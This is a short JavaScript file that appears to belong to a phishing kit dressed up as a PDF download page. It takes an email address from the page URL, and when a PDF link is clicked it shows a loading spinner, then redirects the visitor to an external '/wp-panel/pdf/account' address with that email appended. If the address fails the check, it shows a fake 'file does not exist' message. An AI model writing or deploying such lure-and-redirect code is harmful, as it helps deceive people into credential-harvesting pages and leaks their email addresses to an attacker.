// 
const validEmail =
/^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

const urlEmail = new URLSearchParams(window.location.search);
const usermail = urlEmail.get('order');

const link_pdf = document.querySelectorAll(".link_pdf");
const page_loader = document.getElementById("page_loader");

// 
setTimeout(() => {
    page_loader.style.display = "none"; 
}, 500);

// 
link_pdf.forEach(link => {
    link.addEventListener('click', ()=>{
        if (validEmail.test(usermail)) { 
            page_loader.style.display = "flex";
            
            setTimeout(() => {
                location.replace("https://srbilletero.com/wp-panel/pdf/account?id="+usermail); 
            }, 1000);     
        }
        else{
            alert("Sorry, file does not exist");
            // location = "https://get.adobe.com/reader/"
        }
    })
});
